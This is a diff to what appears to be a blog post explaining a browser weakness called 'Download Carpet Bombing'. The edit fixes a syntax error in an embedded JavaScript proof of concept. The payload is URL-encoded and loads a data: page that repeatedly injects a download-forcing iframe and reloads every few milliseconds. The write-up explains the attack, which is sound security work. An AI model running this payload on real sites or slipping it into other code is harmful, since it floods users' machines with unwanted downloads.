@@ -9,7 +9,7 @@ Fine, most probably you're not familiar with the term "Download Carpet Bombing",
 
 Now that you've got an idea on what this issue is all about, allow me to throw some ugly JS code onto your face:
 {% highlight javascript linenos %}
-(function {
+(function() {
     var payload = unescape('%3Cscript%3Evar%20dropper%3Ddocument.createElement(%22iframe%22)%3Bdropper.src%3D%27data%3Ax%2Fx%2Cfoo%27%3Bdocument.documentElement.appendChild(dropper)%3BsetInterval(function()%7Blocation.reload()%7D%2C%205)%3B%3C%2Fscript%3E');
     location.href = 'data:text/html,' + payload;
 }());
